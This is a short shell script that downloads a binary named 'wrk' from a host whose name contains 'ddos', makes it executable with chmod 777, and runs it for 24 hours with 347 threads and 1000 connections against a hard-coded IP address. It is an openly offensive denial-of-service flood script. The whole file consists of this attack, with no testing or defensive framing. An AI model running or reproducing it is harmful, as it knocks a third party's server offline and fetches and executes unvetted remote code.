#!/bin/sh

#Download wrk
curl -O https://ddos.nms.workers.dev/wrk

#Chmod
chmod 777 wrk

#running
./wrk -t347 -c1000 -d86400s http://51.38.92.223
